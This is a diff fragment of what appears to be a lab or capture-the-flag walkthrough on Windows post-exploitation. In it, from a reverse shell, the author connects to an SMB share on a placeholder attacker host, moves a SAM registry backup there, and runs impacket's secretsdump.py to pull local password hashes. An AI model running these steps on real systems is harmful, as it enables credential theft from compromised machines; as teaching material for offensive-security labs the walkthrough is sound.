@@ -18,10 +18,10 @@ It's up to you how you choose to exfiltrate the files.  We can use impacket smb 
 Now, in our reverse shell, we can use this command to authenticate:  
 `net use \\ATTACKER_IP\share /USER:user s3cureP@ssword`
 
-
+`move sam.bak \\ATTACKING_IP\share\sam.bak`
 
 ---
 
 Once we have the .bak files back on our machine, we can use secretsdump.py
 
-`python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL`
+`python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`
